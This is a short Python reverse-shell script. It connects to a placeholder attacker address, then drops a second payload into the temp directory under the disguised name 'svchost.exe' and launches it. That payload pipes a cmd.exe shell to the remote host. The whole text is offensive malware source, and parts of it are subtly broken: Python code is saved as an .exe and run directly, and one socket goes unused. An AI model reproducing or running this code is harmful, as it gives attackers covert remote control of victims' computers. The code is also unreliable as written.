import socket,subprocess,os,tempfile;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('YOUR_IP',1234));
tdirectory=tempfile.gettempdir();
tfile=os.path.join(tdirectory,'svchost.exe');
with open(tfile,'w+') as f:
    f.write('''
import subprocess
import os
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('YOUR_IP',1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['cmd.exe'])
''')
subprocess.Popen([tfile])